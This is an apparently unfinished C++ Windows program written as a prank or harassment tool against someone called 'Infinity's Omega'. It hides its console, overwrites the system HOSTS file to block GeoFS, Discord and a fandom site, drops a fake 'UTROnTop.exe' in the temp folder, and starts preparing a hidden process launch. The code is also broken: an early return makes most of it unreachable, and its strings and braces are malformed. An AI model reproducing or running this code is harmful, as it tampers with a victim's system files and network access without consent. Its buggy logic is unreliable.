// THIS PROGRAM IS WIP THIS PROGRAM IS WIP THIS PROGRAM IS WIP //
// DO NOT USE DO NOT USE DO NOT USE //
// made by freyjapaws //
// blocks GeoFS sites //
// probably hella buggy //

#include <windows.h>
#include <winable.h>
#include <stdio.h>
#include <mmsystem.h>
#include <sstream>
#include <iostream>
#include <fstream>
#include <stdio.h>

using namespace std;

const char msg1[]="Infinity's Omega, you've been pwned!";

int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE PrevInstance,
                            LPSTR lpszArgument, int nFunsterStil)

{
     HWND hide;
AllocConsole();
hide = FindWindowA("ConsoleWindowClass", NULL);
ShowWindow(hide, 0);
          
{
	CreateMutexA(NULL, TRUE, "SwissMiss"); 
if (GetLastError() == ERROR_ALREADY_EXISTS)
ExitProcess(0); 
return 0;
}

{
char host[MAX_PATH];
GetSystemDirectory(host, sizeof(host));
strcat(host, "\\Drivers\\ETC\\HOSTS");
	const char* buffer =
                       "127.0.0.1     www.geofs.com/geofs.php";
                       "127.0.0.1     www.discord.com";
                       "127.0.0.1     www.geofs.fandom.com";
                       
DWORD byte;
HANDLE hFile = CreateFile(host, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
BOOL bSuccess = WriteFile ( hFile, buffer, strlen(buffer), &byte, NULL);
CloseHandle(hFile);
}

{
	char txtfile[MAX_PATH]; 
	char tempdir[MAX_PATH]; 
	char ttxtline[MAX_PATH];
	char txtline[MAX_PATH];
	char This_File[MAX_PATH];
	HANDLE f;
	DWORD r;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	GetTempPath(sizeof(tempdir), tempdir);
	sprintf(txtfile, "%s\\UTROnTop.exe", tempdir);
	f = CreateFile(txtfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f != INVALID_HANDLE_VALUE) {
		WriteFile(f, "Get pwned Infinity's Omega.", 105, &r, NULL);
		CloseHandle(f);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;
		memset(This_File,0,sizeof(This_File));
		GetModuleFileName(NULL, This_File, sizeof(This_File));
		ExpandEnvironmentStrings(ttxtline, txtline, sizeof(txtline)); 
}
